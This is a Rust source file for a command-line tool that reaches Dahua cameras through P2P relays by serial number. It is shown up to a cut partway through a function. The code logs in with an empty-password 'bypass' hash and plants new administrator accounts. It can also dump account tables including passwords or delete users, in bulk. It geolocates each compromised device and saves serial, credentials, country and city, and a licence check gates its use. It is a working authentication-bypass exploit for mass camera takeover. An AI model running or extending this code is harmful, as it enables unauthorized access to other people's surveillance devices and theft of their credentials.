mod p2p;

use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Duration;

use clap::Parser;
use dahua_dhip_adduser::license;
use p2p::*;
use serde_json::{json, Value};
use tokio::net::UdpSocket;
use tokio::sync::Mutex;

#[derive(Parser)]
#[command(name = "dahua-dhip-adduser", about = "Add a user to Dahua devices via P2P/DHIP")]
struct Args {
    #[arg(long, conflicts_with = "serials_file")]
    serial: Option<String>,
    #[arg(short = 'f', long, conflicts_with = "serial")]
    serials_file: Option<String>,
    #[arg(short = 'P', long, default_value_t = 5000)]
    port: u16,
    #[arg(long)]
    relay: bool,
    #[arg(long, default_value = "admin")]
    admin_user: String,
    #[arg(short = 'p', long, default_value = "")]
    admin_pass: String,
    #[arg(short = 'u', long, default_value = "")]
    user: String,
    #[arg(short = 'w', long, default_value = "")]
    password: String,
    #[arg(long)]
    list_users: bool,
    #[arg(long, help = "Dump the raw Account table (includes the Password field) from each device")]
    dump_account: bool,
    #[arg(long, help = "Delete the user with the given numeric Id from each device")]
    delete_user: Option<u32>,
    #[arg(long, help = "Delete the user with the given Name from each device")]
    delete_user_name: Option<String>,
    #[arg(long, default_value = "")]
    memo: String,
    #[arg(long, default_value = "admin", help = "User group: 'admin' (all permissions) or 'user' (monitor+playback on all channels)")]
    group: String,
    #[arg(short, long)]
    verbose: bool,
    #[arg(long, help = "Use HTTP/RPC2 protocol (port 80) instead of DHIP (port 5000)")]
    http: bool,
    #[arg(long, default_value = "ok_serials.txt")]
    ok_file: String,
    #[arg(long, default_value = "nok_serials.txt")]
    nok_file: String,
}

fn license_status_reason(st: &license::LicenseStatus) -> String {
    match st {
        license::LicenseStatus::Missing => "file licence.lic non trovato".into(),
        license::LicenseStatus::Empty => "file licence.lic vuoto".into(),
        license::LicenseStatus::Invalid(r) => format!("file licenza non valido: {}", r),
        license::LicenseStatus::Valid => "".into(),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    HTTP_DEBUG.store(args.verbose, Ordering::Relaxed);
    let probe_timeout = Duration::from_secs(10);

    match license::check_license() {
        license::LicenseStatus::Valid => {}
        st => {
            eprintln!("[licenza] Bloccato: {}", license_status_reason(&st));
            eprintln!("[licenza] ID macchina: {}", license::machine_id());
            eprintln!(
                "[licenza] Per attivare: genera una licenza con 'license-gen' e crea il file \
                 licence.lic accanto a questo eseguibile."
            );
            std::process::exit(1);
        }
    }

    let serials: Vec<String> = if let Some(ref path) = args.serials_file {
        match dahua_dhip_adduser::serials::parse_serials_file(path) {
            Ok(list) => list,
            Err(e) => {
                eprintln!("[-] Failed to read serials file '{}': {}", path, e);
                std::process::exit(1);
            }
        }
    } else if let Some(ref s) = args.serial {
        vec![s.clone()]
    } else {
        eprintln!("[--serial | -f] specify --serial or -f <file>");
        std::process::exit(1);
    };

    if args.list_users || args.dump_account {
        return list_users(&serials, &args, probe_timeout).await;
    }

    if let Some(id) = args.delete_user {
        return delete_users(&serials, Some(id), None, &args, probe_timeout).await;
    }

    if let Some(name) = &args.delete_user_name {
        return delete_users(&serials, None, Some(name.clone()), &args, probe_timeout).await;
    }

    if args.user.is_empty() || args.password.is_empty() {
        eprintln!("[-] --user (-u) and --password (-w) are required");
        std::process::exit(1);
    }

    println!("[*] {} serial(s) to process", serials.len());

    let mut ok_count = 0u32;
    let mut fail_count = 0u32;
    let mut ok_serials: Vec<String> = Vec::new();
    let mut nok_serials: Vec<String> = Vec::new();

    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        match try_add_user(serial, &args, probe_timeout).await {
            Ok(geo) => {
                println!("[+] {} \u{2192} OK", serial);
                ok_count += 1;
                let geo = geo.unwrap_or_default();
                ok_serials.push(format!(
                    "{}_{}_{}_{}_{}",
                    geo.country_code, serial, args.user, args.password, geo.city
                ));
            }
            Err(e) => { println!("[-] {} \u{2192} FAIL: {}", serial, e); fail_count += 1; nok_serials.push(format!("{}: {}", serial, e)); }
        }
    }

    std::fs::write(&args.ok_file, ok_serials.join("\n")).ok();
    std::fs::write(&args.nok_file, nok_serials.join("\n")).ok();

    if !ok_serials.is_empty() {
        let now: chrono::DateTime<chrono::Local> = chrono::Local::now();
        let xml_name = format!(
            "{:04}{:02}{:02}-{:02}{:02}{:02}.xml",
            now.year(), now.month(), now.day(),
            now.hour(), now.minute(), now.second()
        );
        match generate_smartpss_from_ok(&ok_serials, &xml_name) {
            Ok(()) => println!("[*] SmartPSS XML saved to {}", xml_name),
            Err(e) => eprintln!("[-] SmartPSS XML generation failed: {}", e),
        }
    }

    println!("\n========================================");
    println!("[*] DONE \u{2014} {} OK, {} FAIL out of {}", ok_count, fail_count, serials.len());
    if !ok_serials.is_empty() {
        println!("[*] OK serials saved to {}", args.ok_file);
    }
    if !nok_serials.is_empty() {
        println!("[*] NOK serials saved to {}", args.nok_file);
    }

    Ok(())
}

/// List users on each device via DHIP getUserList.
/// P2P handshake with automatic retries (some devices/relays are flaky and
/// time out on the first attempts).
async fn p2p_handshake_retry(
    serial: &str,
    args: &Args,
    verbose: bool,
) -> Result<HandshakeResult, String> {
    let attempts = 3;
    let mut last_err = String::from("unknown error");
    for attempt in 1..=attempts {
        match p2p_handshake(serial, args.relay, &args.admin_user, &args.admin_pass).await {
            Ok(hr) => return Ok(hr),
            Err(e) => {
                last_err = e;
                if attempt < attempts {
                    if verbose { eprintln!("[debug] P2P handshake attempt {} failed ({}), retrying...", attempt, last_err); }
                    tokio::time::sleep(Duration::from_secs(3)).await;
                }
            }
        }
    }
    Err(last_err)
}

async fn list_users(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => { eprintln!("  [-] P2P handshake failed: {}", e); continue; }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        if args.dump_account {
            let result = http_list_users(sock, pcp_session, probe_timeout, args.verbose, true, &args.admin_user, &args.admin_pass).await;
            if let Err(e) = result {
                eprintln!("  [-] Failed to dump Account table: {}", e);
            }
            continue;
        }

        // Try DHIP list first (reuse the port-5000 session from the challenge).
        // On some devices the port-5000 bind only works before an HTTP port-80 session.
        match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some((realm_id, realm)) => {
                if args.verbose { eprintln!("[debug] DHIP realm: {:?}", realm); }
                let dhip_result = dhip_list_users(sock, pcp_session, realm_id, &realm, args, probe_timeout).await;
                match dhip_result {
                    Ok(()) => {}
                    Err(e) => {
                        ptcp_disconnect(sock, pcp_session, realm_id).await;
                        if args.verbose { eprintln!("[debug] DHIP list failed ({}), trying HTTP", e); }
                        let result = http_list_users(sock, pcp_session, probe_timeout, args.verbose, false, &args.admin_user, &args.admin_pass).await;
                        if let Err(e2) = result {
                            if args.verbose { eprintln!("[debug] HTTP list failed: {}", e2); }
                            eprintln!("  [-] Failed to list users");
                        }
                    }
                }
            }
            None => { eprintln!("  [-] DHIP challenge failed"); }
        }
    }
    Ok(())
}

/// Print a user row as `Id<TAB>Name<TAB>Group<TAB>Password`.
fn print_user_row(user: &Value) {
    let id = user.get("Id").and_then(|i| i.as_i64()).unwrap_or(-1);
    let name = user.get("Name").and_then(|n| n.as_str()).unwrap_or("?");
    let group = user.get("Group").and_then(|g| g.as_str()).unwrap_or("?");
    let pass = user.get("Password").and_then(|p| p.as_str()).unwrap_or("null");
    println!("  {}\t{}\t{}\t{}", id, name, group, pass);
}

/// Retry PTCP bind a few times (some devices reject a new bind right after a session).
async fn ptcp_bind_retry(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    bind_timeout: Duration,
    verbose: bool,
) -> Option<u32> {
    for attempt in 1..=3 {
        if let Some(id) = ptcp_bind(sock, pcp_session, port, bind_timeout).await {
            return Some(id);
        }
        if verbose {
            eprintln!("[debug] PTCP bind port {} attempt {} failed, retrying...", port, attempt);
        }
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    None
}

/// List users via HTTP/RPC2 (try port 80, then 5000).
async fn http_list_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    _probe_timeout: Duration,
    verbose: bool,
    dump_account: bool,
    admin_user: &str,
    admin_pass: &str,
) -> Result<(), String> {
    let timeout = Duration::from_secs(15);
    for &port in &[80u16, 5000] {
        if verbose { eprintln!("[debug] http_list_users: trying port {}", port); }
        let result = http_list_users_on_port(sock, pcp_session, port, timeout, verbose, dump_account, admin_user, admin_pass).await;
        match result {
            Ok(()) => return Ok(()),
            Err(e) => { if verbose { eprintln!("[debug] http_list_users: port {} failed: {}", port, e); } }
        }
    }
    Err("HTTP list users failed on all ports".into())
}

/// HTTP list users on a specific port. Uses "admin" as default admin user.
/// HTTP list users on a specific port.
async fn http_list_users_on_port(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    timeout: Duration,
    verbose: bool,
    dump_account: bool,
    admin_user: &str,
    admin_pass: &str,
) -> Result<(), String> {
    if verbose { eprintln!("[debug] http_list_users_on_port: trying port {}", port); }
    let bind_timeout = Duration::from_secs(15);
    let realm_id = match ptcp_bind_retry(sock, pcp_session, port, bind_timeout, verbose).await {
        Some(id) => id,
        None => return Err(format!("PTCP bind failed on port {}", port)),
    };
    let host = format!("127.0.0.1:{}", port);

    // Login challenge
    let login1 = json!({"method": "global.login", "params": {
        "userName": admin_user, "password": "", "clientType": "Web3.0", "loginType": "Direct",
    }, "id": 10000});

    let resp1 = match http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
        &login1.to_string(), timeout, "").await
    {
        Some(r) => r,
        None => { ptcp_disconnect(sock, pcp_session, realm_id).await; return Err("HTTP login challenge timeout".into()); }
    };

    let resp1_body = match http_extract_body(&resp1) {
        Some(b) => b,
        None => { ptcp_disconnect(sock, pcp_session, realm_id).await; return Err("No body in challenge response".into()); }
    };

    let val1 = match serde_json::from_str::<Value>(resp1_body) {
        Ok(v) => v,
        Err(e) => { ptcp_disconnect(sock, pcp_session, realm_id).await; return Err(format!("bad JSON: {}", e)); }
    };

    let session = val1.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let realm = val1.get("params").and_then(|p| p.get("realm")).and_then(|v| v.as_str()).unwrap_or("Login");
    let random = val1.get("params").and_then(|p| p.get("random")).and_then(|v| v.as_str()).unwrap_or("");

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !admin_pass.is_empty() {
        let pw_hash = password_hash(admin_user, realm, random, admin_pass);
        let login2 = json!({"method": "global.login", "session": &session, "params": {
            "userName": admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
            "loginType": "Loopback", "clientType": "Local", "authorityType": "Default",
            "passwordType": "Default",
        }, "id": 10001});
        if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
            &login2.to_string(), timeout, &session).await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if verbose { eprintln!("[debug] HTTP login via password"); }
                        login_ok = true;
                    }
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(admin_user, realm, random);
        for (login_type, client_type) in &[("Loopback", "Local"), ("Direct", "NetKeyboard")] {
            let login2 = json!({"method": "global.login", "session": &session, "params": {
                "userName": admin_user, "password": hash, "ipAddr": "127.0.0.1",
                "loginType": login_type, "clientType": client_type, "authorityType": "Default",
                "passwordType": "Default",
            }, "id": 10001});
            if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
                &login2.to_string(), timeout, &session).await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("bypass login failed".into());
    }

    // Try multiple methods to list users
    let mut found = false;
    let queries: &[(&str, serde_json::Value)] = if dump_account {
        &[
            ("configManager.getConfig", json!({"name": "Account"})),
            ("userManager.getUserInfoAll", json!({})),
        ]
    } else {
        &[
            ("userManager.getUserInfoAll", json!({})),
            ("userManager.getUserList", json!({})),
            ("configManager.getConfig", json!({"name": "Account"})),
            ("configManager.getConfig", json!({"name": "UserManager"})),
            ("configManager.getConfig", json!({"name": "User"})),
            ("configManager.getConfig", json!({"name": "user"})),
        ]
    };
    for (method, params) in queries {
        let body = json!({"method": method, "session": &session,
            "params": params, "id": 102});
        if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2",
            &body.to_string(), timeout, &session).await
        {
            if let Some(b) = http_extract_body(&t) {
                if verbose { eprintln!("[debug] {} response: {}", method, b); }
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    let users = if *method == "configManager.getConfig" {
                        v.get("params").and_then(|p| p.get("table")).and_then(|t| t.get("User")).and_then(|u| u.as_array())
                    } else {
                        v.get("params").and_then(|p| p.get("users")).and_then(|u| u.as_array())
                            .or_else(|| v.get("params").and_then(|p| p.as_array()))
                    };
                    if let Some(arr) = users {
                        if !arr.is_empty() {
                            for (_idx, user) in arr.iter().enumerate() {
                                print_user_row(user);
                                found = true;
                            }
                            break;
                        }
                    } else if verbose {
                        let err = v.get("error").and_then(|e| e.get("message")).and_then(|m| m.as_str()).unwrap_or("no users array / no error field");
                        eprintln!("[debug] {}: no users array ({})", method, err);
                    }
                }
            }
        } else if verbose {
            eprintln!("[debug] {}: http_call returned None (timeout)", method);
        }
    }
    // Also try userManager.getUser with empty name (some firmwares return all)
    if !found {
        let body = json!({"method": "userManager.getUser", "session": &session,
            "params": {"Name": ""}, "id": 103});
        if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2",
            &body.to_string(), timeout, &session).await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    eprintln!("[debug] getUser response: {}", v);
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                            for (_idx, user) in params.iter().enumerate() {
                                print_user_row(user);
                                found = true;
                            }
                        }
                    }
                }
            }
        }
    }
    let result = if found { Ok(()) } else { Err("no user list methods returned data".into()) };

    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Bypass login and list users via DHIP on an already-bound session.
async fn dhip_list_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    dh_realm: &str,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let dhip = Arc::new(Mutex::new(DhipSession::new(realm_id)));

    // Challenge
    let login1 = json!({
        "id": 1, "magic": "0x1234", "method": "global.login",
        "params": {
            "clientType": "Web3.0", "ipAddr": "127.0.0.1",
            "loginType": "Direct", "password": "", "userName": &args.admin_user,
        },
        "session": 0,
    });
    let resp1 = dhip_call(sock, pcp_session, &dhip, &login1.to_string(), probe_timeout).await
        .ok_or("Challenge timeout")?;
    let val1: Value = serde_json::from_str(&resp1).map_err(|e| format!("bad JSON: {}", e))?;
    let realm = val1.get("params").and_then(|p| p.get("realm")).and_then(|v| v.as_str()).unwrap_or(dh_realm);
    let random = val1.get("params").and_then(|p| p.get("random")).and_then(|v| v.as_str()).unwrap_or("");
    let mut session_id = val1.get("session").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    { let mut d = dhip.lock().await; d.session_id = session_id; }

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, realm, random, &args.admin_pass);
        let login2 = json!({
            "id": 2, "magic": "0x1234", "method": "global.login",
            "params": {
                "userName": &args.admin_user, "password": pw_hash,
                "clientType": "Local", "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "authorityType": "Default",
                "passwordType": "Default",
            },
            "session": session_id,
        });
        if let Some(t) = dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                        session_id = s as u32;
                        { let mut d = dhip.lock().await; d.session_id = session_id; }
                    }
                    if args.verbose { eprintln!("[debug] DHIP login via password"); }
                    login_ok = true;
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(&args.admin_user, realm, random);
        for (login_type, client_type) in &[("Loopback", "Local"), ("Direct", "NetKeyboard")] {
            let login2 = json!({
                "id": 2, "magic": "0x1234", "method": "global.login",
                "params": {
                    "userName": &args.admin_user, "password": hash,
                    "clientType": client_type, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "authorityType": "Default",
                    "passwordType": "Default",
                },
                "session": session_id,
            });
            if let Some(t) = dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                            session_id = s as u32;
                            { let mut d = dhip.lock().await; d.session_id = session_id; }
                        }
                        login_ok = true;
                        break;
                    }
                }
            }
        }
    }
    if !login_ok { ptcp_disconnect(sock, pcp_session, realm_id).await; return Err("bypass login failed".into()); }

    // Try userManager.getUserInfoAll first (known working method), then getUserList,
    // then fall back to configManager.getConfig (Account table)
    let req_list = json!({"id": 100, "magic": "0x1234", "method": "userManager.getUserInfoAll",
        "params": {}, "session": session_id});
    let mut listed = if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req_list.to_string(), probe_timeout).await {
        if args.verbose { eprintln!("[debug] DHIP getUserInfoAll response: {}", t); }
        if let Ok(v) = serde_json::from_str::<Value>(&t) {
            if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                if let Some(arr) = v.get("params").and_then(|p| p.get("users")).and_then(|u| u.as_array()) {
                    for user in arr.iter() {
                        print_user_row(user);
                    }
                    !arr.is_empty()
                } else { false }
            } else { false }
        } else { false }
    } else { false };

    if !listed {
        let req_list2 = json!({"id": 100, "magic": "0x1234", "method": "userManager.getUserList",
            "params": {}, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req_list2.to_string(), probe_timeout).await {
            if args.verbose { eprintln!("[debug] DHIP getUserList response: {}", t); }
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    if let Some(arr) = v.get("params").and_then(|p| p.as_array()) {
                        for user in arr.iter() {
                            print_user_row(user);
                        }
                        if !arr.is_empty() { listed = true; }
                    }
                }
            }
        }
    }

    if !listed {
        if args.verbose { eprintln!("[debug] trying fallback methods for user list"); }
        // Try configManager.getConfig with various config names
        for cfg_name in &["Account", "account", "UserManager", "Security", "System"] {
            let req = json!({"id": 101, "magic": "0x1234", "method": "configManager.getConfig",
                "params": {"name": cfg_name}, "session": session_id});
            if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req.to_string(), probe_timeout).await {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if args.verbose { eprintln!("[debug] getConfig({}) response: {}", cfg_name, v); }
                    if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                        if let Some(table) = v.get("params").and_then(|p| p.get("table")) {
                            if let Some(users) = table.get("User").and_then(|u| u.as_array()) {
                                for user in users {
                                    print_user_row(user);
                                }
                                if !users.is_empty() { break; }
                            }
                        }
                    }
                }
            }
        }
    }

    let _ = dhip_call(sock, pcp_session, &dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    Ok(())
}

async fn try_add_user(
    serial: &str,
    args: &Args,
    probe_timeout: Duration,
) -> Result<Option<dahua_dhip_adduser::geo::GeoInfo>, String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose).await.map_err(|e| format!("P2P handshake failed: {}", e))?;
    let device_ip = hr.device_public_ip.clone();

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    // Step 1: DHIP login challenge to get numeric realm (SmartPSS uses this realm)
    let (dh_realm_id, dh_realm) = dhp_challenge(sock, pcp_session, args, probe_timeout).await
        .ok_or("DHIP challenge failed (no realm)")?;

    if args.verbose {
        eprintln!("[debug] DHIP realm: {:?}", dh_realm);
    }

    // Try HTTP/RPC2 on port 80 first, then 5000.
    ptcp_disconnect(sock, pcp_session, dh_realm_id).await;
    let ports = &[80u16, 5000];
    let mut last_err = String::new();
    for &port in ports {
        let result = http_try_add_user(sock, pcp_session, &dh_realm, port, args, probe_timeout).await;
        match result {
            Ok(()) => return Ok(resolve_geo(&device_ip).await),
            Err(e) => {
                last_err = e;
                if port == ports[ports.len() - 1] {
                    break;
                }
                if args.verbose {
                    eprintln!("[debug] HTTP on port {} failed ({}), trying next port...", port, last_err);
                }
            }
        }
    }

    // Fallback: try DHIP binary addUser if HTTP didn't work (its bypass tries
    // Admin authority combos the HTTP path does too).
    if !last_err.is_empty() {
        if args.verbose { eprintln!("[debug] HTTP addUser failed, trying DHIP addUser"); }
        let dhip_result = dhip_try_add_user(sock, pcp_session, &dh_realm, args, probe_timeout).await;
        return match dhip_result {
            Ok(()) => Ok(resolve_geo(&device_ip).await),
            Err(e) => Err(e),
        };
    }
    Err(last_err)
}

/// Resolve the device public IP to a country code + city (None on failure).
async fn resolve_geo(device_ip: &str) -> Option<dahua_dhip_adduser::geo::GeoInfo> {
    if device_ip.is_empty() {
        return None;
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] resolving geo for public IP {}", device_ip);
    }
    dahua_dhip_adduser::geo::lookup(device_ip).await
}

/// Fallback: add user via DHIP binary protocol (for devices without HTTP).
async fn dhip_try_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dh_realm: &str,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let bind_timeout = Duration::from_secs(15);
    let realm_id = ptcp_bind(sock, pcp_session, 5000, bind_timeout).await
        .ok_or("PTCP bind on port 5000 failed")?;

    let dhip = Arc::new(Mutex::new(DhipSession::new(realm_id)));

    let login1 = json!({
        "id": 1, "magic": "0x1234", "method": "global.login",
        "params": {
            "clientType": "Web3.0", "ipAddr": "127.0.0.1",
            "loginType": "Direct", "password": "", "userName": &args.admin_user,
        },
        "session": 0,
    });

    let resp1 = dhip_call(sock, pcp_session, &dhip, &login1.to_string(), probe_timeout).await
        .ok_or("DHIP challenge timeout")?;
    let val1: Value = serde_json::from_str(&resp1).map_err(|e| format!("bad JSON: {}", e))?;

    let realm = val1.get("params").and_then(|p| p.get("realm")).and_then(|v| v.as_str()).unwrap_or(dh_realm);
    let random = val1.get("params").and_then(|p| p.get("random")).and_then(|v| v.as_str()).unwrap_or("");
    let mut session_id = val1.get("session").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

    { let mut d = dhip.lock().await; d.session_id = session_id; }

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, realm, random, &args.admin_pass);
        let login2 = json!({
            "id": 2, "magic": "0x1234", "method": "global.login",
            "params": {
                "userName": &args.admin_user, "password": pw_hash,
                "clientType": "Local", "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "authorityType": "Default",
                "passwordType": "Default",
            },
            "session": session_id,
        });
        if let Some(t) = dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                        session_id = s as u32;
                        { let mut d = dhip.lock().await; d.session_id = session_id; }
                    }
                    login_ok = true;
                    if args.verbose { eprintln!("[debug] DHIP add login via password"); }
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(&args.admin_user, realm, random);
        for (login_type, client_type, authority) in &[
            ("Loopback", "Local", "Admin"),
            ("Network", "InetWeb", "Admin"),
            ("Direct", "Web", "Admin"),
            ("Loopback", "Local", "Default"),
            ("Direct", "NetKeyboard", "Default"),
            ("Network", "InetWeb", "Default"),
        ] {
            let login2 = json!({
                "id": 2, "magic": "0x1234", "method": "global.login",
                "params": {
                    "userName": &args.admin_user, "password": hash,
                    "clientType": client_type, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "authorityType": authority,
                    "passwordType": "Default",
                },
                "session": session_id,
            });
            if let Some(t) = dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                            session_id = s as u32;
                            { let mut d = dhip.lock().await; d.session_id = session_id; }
                        }
                        login_ok = true;
                        if args.verbose { eprintln!("[debug] DHIP add login via {}/{} ({})", client_type, login_type, authority); }
                        break;
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("DHIP bypass login failed".into());
    }

    // DHIP addUser with HA1 hash (MD5(user:realm:password)) so SmartPSS can authenticate
    let pw_hash = http_adduser_password_hash(&args.user, dh_realm, &args.password);
    let result = dhip_add_user_with_account(sock, pcp_session, &dhip, session_id, &pw_hash, args).await;
    let _ = dhip_call(sock, pcp_session, &dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Delete a user via DHIP binary protocol on port 5000.
async fn dhip_try_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let bind_timeout = Duration::from_secs(15);
    let realm_id = ptcp_bind(sock, pcp_session, 5000, bind_timeout).await
        .ok_or("PTCP bind on port 5000 failed")?;

    let dhip = Arc::new(Mutex::new(DhipSession::new(realm_id)));

    let login1 = json!({
        "id": 1, "magic": "0x1234", "method": "global.login",
        "params": {
            "clientType": "Web3.0", "ipAddr": "127.0.0.1",
            "loginType": "Direct", "password": "", "userName": &args.admin_user,
        },
        "session": 0,
    });

    let resp1 = dhip_call(sock, pcp_session, &dhip, &login1.to_string(), probe_timeout).await
        .ok_or("DHIP challenge timeout")?;
    let val1: Value = serde_json::from_str(&resp1).map_err(|e| format!("bad JSON: {}", e))?;

    let realm = val1.get("params").and_then(|p| p.get("realm")).and_then(|v| v.as_str()).unwrap_or("");
    let random = val1.get("params").and_then(|p| p.get("random")).and_then(|v| v.as_str()).unwrap_or("");
    let mut session_id = val1.get("session").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

    { let mut d = dhip.lock().await; d.session_id = session_id; }

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, realm, random, &args.admin_pass);
        let login2 = json!({
            "id": 2, "magic": "0x1234", "method": "global.login",
            "params": {
                "userName": &args.admin_user, "password": pw_hash,
                "clientType": "Local", "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "authorityType": "Default",
                "passwordType": "Default",
            },
            "session": session_id,
        });
        if let Some(t) = dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                        session_id = s as u32;
                        { let mut d = dhip.lock().await; d.session_id = session_id; }
                    }
                    login_ok = true;
                    if args.verbose { eprintln!("[debug] DHIP delete login via password"); }
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(&args.admin_user, realm, random);
        for (login_type, client_type, authority) in &[
            ("Loopback", "Local", "Default"),
            ("Direct", "NetKeyboard", "Default"),
        ] {
            let login2 = json!({
                "id": 2, "magic": "0x1234", "method": "global.login",
                "params": {
                    "userName": &args.admin_user, "password": hash,
                    "clientType": client_type, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "authorityType": authority,
                    "passwordType": "Default",
                },
                "session": session_id,
            });
            if let Some(t) = dhip_call(sock, pcp_session, &dhip, &login2.to_string(), probe_timeout).await {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(s) = v.get("session").and_then(|v| v.as_u64()) {
                            session_id = s as u32;
                            { let mut d = dhip.lock().await; d.session_id = session_id; }
                        }
                        login_ok = true;
                        if args.verbose { eprintln!("[debug] DHIP delete login via {}/{}", client_type, login_type); }
                        break;
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("DHIP bypass login failed".into());
    }

